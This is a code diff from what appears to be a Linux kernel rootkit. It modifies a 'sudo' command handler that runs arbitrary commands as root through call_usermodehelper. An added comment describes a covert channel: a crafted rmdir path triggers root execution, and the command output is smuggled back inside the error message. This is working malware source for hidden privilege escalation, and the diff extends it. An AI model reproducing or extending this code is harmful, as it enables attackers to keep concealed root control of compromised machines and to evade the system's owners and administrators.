@@ -12,11 +12,18 @@
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-int sudo(char *argv[], int argc) {
+/*
+ * Execute command as root and return command response by faking pathname, like:
+$ rmdir dza
+rmdir: failed to remove 'dza': No such file or directory
+$ rmdir randomcanary.sudo.id
+rmdir: failed to remove 'uid=0(root) gid=0(root) groups=0(root)': No such file or directory
+ */
+int sudo(const struct pt_regs *regs, char *argv[], int argc) {
     int ret = 0;
 
     if (argc == 0) {
-        rk_err("[dispatcher] 'sudo' command requires at least one argument (the command to run).\n");
+        rk_err("[dispatcher:sudo] 'sudo' command requires at least one argument (the command to run).\n");
     } else {
         size_t cmd_len = 0;
         for (int i = 0; i < argc; i++) {
@@ -27,7 +34,7 @@ int sudo(char *argv[], int argc) {
         }
         char *full_cmd_string = kmalloc(cmd_len + 1, GFP_KERNEL);
         if (!full_cmd_string) {
-            rk_err("[dispatcher] Failed to allocate memory for full_cmd_string.\n");
+            rk_err("[dispatcher:sudo] Failed to allocate memory for full_cmd_string.\n");
             ret = -ENOMEM;
         } else {
             full_cmd_string[0] = '\0';
@@ -39,7 +46,7 @@ int sudo(char *argv[], int argc) {
                 }
             }
 
-            rk_info("[dispatcher] executing as root: '%s'\n", full_cmd_string);
+            rk_info("[dispatcher:sudo] executing as root: '%s'\n", full_cmd_string);
 
             static char *envp[] = {
                 "SHELL=/bin/sh",
@@ -66,9 +73,9 @@ int sudo(char *argv[], int argc) {
             );
 
             if (ret != 0) {
-                rk_err("[dispatcher] call_usermodehelper() failed with error code -> %d\n", ret);
+                rk_err("[dispatcher:sudo] call_usermodehelper() failed with error code -> %d\n", ret);
             } else {
-                rk_info("[dispatcher] call_usermodehelper() successfully executed -> %d\n", ret);
+                rk_info("[dispatcher:sudo] call_usermodehelper() successfully executed -> %d\n", ret);
             }
 
             kfree(full_cmd_string);
